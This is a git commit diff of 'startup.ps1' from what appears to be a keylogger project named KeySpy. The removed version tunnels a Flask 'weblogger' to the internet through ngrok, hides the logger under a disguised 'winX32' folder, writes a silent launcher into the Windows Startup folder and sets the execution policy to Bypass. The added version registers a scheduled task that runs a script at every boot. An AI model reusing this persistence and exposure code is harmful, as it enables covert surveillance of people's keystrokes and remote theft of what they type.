f0e3229eaf70d2f805ab6e9e68da28b240266229
5pyD3R <samratdey2k21@gmail.com>
2024-04-13 19:57:52 +0530

    update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,35 +1,13 @@
-# Define the port number for Flask web server
-$flaskPort = 5000
+# Define the name for the scheduled task
+$taskName = "ExecuteScriptAtStartup"
 
-# Define the path to weblogger.py file
-$webloggerPath = "C:\Program Files (x86)\winX32\src\weblogger.py"
+# Path to the PowerShell script
+$scriptPath = "C:\path\to\execute.ps1"
 
-# Define the command to execute ngrok
-$ngrokCommand = "ngrok http $flaskPort"
+# Create a new scheduled task
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$scriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
 
-# Define the path to weblogger.py file
-$webloggerPath = "C:\Users\samra\Desktop\KeySpy\src\weblogger.py"
-
-# Define the command to execute weblogger.py
-$webloggerCommand = "python '$webloggerPath'"
-
-# Start ngrok and weblogger.py
-Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $ngrokCommand & $webloggerCommand" -Wait
-
-# Create a PowerShell script to execute ngrok and weblogger.py silently
-$script = @"
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $ngrokCommand' -Wait
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $webloggerCommand' -Wait
-"@
-
-# Define the path to the startup folder
-$startupFolderPath = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start-up
-
-# Define the path to the startup script
-$startupScriptPath = Join-Path -Path $startupFolderPath -ChildPath "execute_ngrok_weblogger.ps1"
-
-# Write the script to the startup script file
-Set-Content -Path $startupScriptPath -Value $script
-
-# Make sure the script can be executed
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+Write-Output "Scheduled task created to execute the PowerShell script at startup."
